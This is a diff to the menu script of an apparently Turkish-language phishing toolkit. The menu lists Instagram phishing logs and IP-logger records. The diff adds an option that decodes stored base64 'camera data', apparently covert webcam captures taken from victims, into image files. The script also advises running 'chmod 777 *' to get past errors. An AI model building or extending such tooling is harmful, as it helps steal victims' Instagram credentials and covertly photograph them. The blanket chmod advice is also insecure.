@@ -14,6 +14,8 @@ print('''Yaptığınız ve yapacağınız her şeyden siz sorumlusunuz.
 ------\     (__)  2-) Instagram Oltalama Kayıtlarına Bak (index.php)
        `-----/		
         	  3-) Ip Logger Kayıtlarına Bak (index2.php)
+        	  
+        	  4-) Kamera Verilerini Resimlere Dönüştür
 
 		Ngrok hata verirse veya permission denied hatası alırsanız
 			chmod 777 * 	yazın 
@@ -35,3 +37,9 @@ elif(oltalama=="3"):
 	print(kayit.read())
 	kayit.close()
 
+elif(oltalama=="4"):
+	print("Sexettintool, verileri daha kolay depolayabilmeniz için resimleri txt formatında tutar. İstediğiniz zaman bu txt dosyasını (oltalama/base64_images.txt) resimlere çevirebilirsiniz.")
+	os.system("python3 oltalama/convert.py")
+	
+else:
+	print("Hatalı Giriş")
